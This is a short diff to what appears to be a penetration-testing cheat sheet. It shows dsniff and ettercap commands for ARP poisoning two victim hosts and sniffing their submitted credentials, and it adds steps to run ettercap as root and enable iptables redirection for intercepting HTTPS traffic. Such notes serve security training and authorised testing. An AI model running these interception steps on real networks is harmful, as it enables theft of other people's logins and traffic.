@@ -114,10 +114,14 @@ $ dsniff -i tap0 // Sniffs authentication packets on specified interface while M
 ```
 Automatically: Ettercap
 ```
-$ ettercap -G
+$ sudo ettercap -G
 Sniff > Unified Sniffing > tap0 // Specify interface to sniff on
 Hosts > Scan for Hosts // Scans for available hosts on network
 Right-click to select Victim 1 and 2
 Mitm > ARP Poisoning > Sniff remote connections
 View > Connections // Ettercap filters credentials submitted in Mitm
+
+// To intercept and analyze HTTPS traffic
+$ sudo nano /etc/ettercap/etter.conf // set uid and gid to 0
+// Additionally, uncomment appropriate redir_command_on/off (in my case, iptables)
 ```
